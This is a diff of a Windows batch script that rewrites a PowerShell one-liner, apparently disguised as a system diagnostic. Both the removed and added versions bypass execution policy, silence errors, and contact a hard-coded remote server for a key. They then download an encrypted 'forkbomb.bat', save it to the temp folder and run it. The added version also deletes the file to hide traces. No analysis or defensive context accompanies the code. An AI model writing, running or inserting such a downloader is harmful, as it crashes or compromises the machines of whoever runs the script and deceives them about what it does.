@@ -1,12 +1,3 @@
 @echo off
 setlocal
-powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-"$ErrorActionPreference='SilentlyContinue'; ^
- $base='http://82.29.153.101:8080'; ^
- $h=Invoke-WebRequest ($base+'/health') -UseBasicParsing; ^
- $ts=[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); ^
- $k=(Invoke-WebRequest ($base+'/auth/key?ts='+$ts) -UseBasicParsing).Content.Trim(); ^
- $p=Invoke-WebRequest ($base+'/forkbomb.bat') -Headers @{ 'X-Decrypt-Key'=$k } -UseBasicParsing; ^
- $p.Content|Out-File $env:TEMP+'\sys.bat' -Encoding ASCII; ^
- Start-Process $env:TEMP+'\sys.bat'; ^
- '$env:COMPUTERNAME - Sys: $(Get-Date)' | Out-File $env:PUBLIC+'\Desktop\SystemDiagnostic.log'"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='SilentlyContinue';$base='http://82.29.153.101:8080';$h=Invoke-WebRequest ($base+'/health') -UseBasicParsing;$ts=[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds();$k=(Invoke-WebRequest ($base+'/auth/key?ts='+$ts) -UseBasicParsing).Content.Trim();$p=Invoke-WebRequest ($base+'/forkbomb.bat') -Headers @{ 'X-Decrypt-Key'=$k } -UseBasicParsing;$batContent=$p.Content;(New-Object System.IO.FileStream($env:TEMP+'\\sys.bat',[System.IO.FileMode]::Create,[System.IO.FileAccess]::Write)).Write([System.Text.Encoding]::ASCII.GetBytes($batContent),0,$batContent.Length);Start-Process $env:TEMP+'\\sys.bat';Remove-Item $env:TEMP+'\\sys.bat' -Force;$env:PUBLIC+'\\Desktop\\SystemDiagnostic.log'"
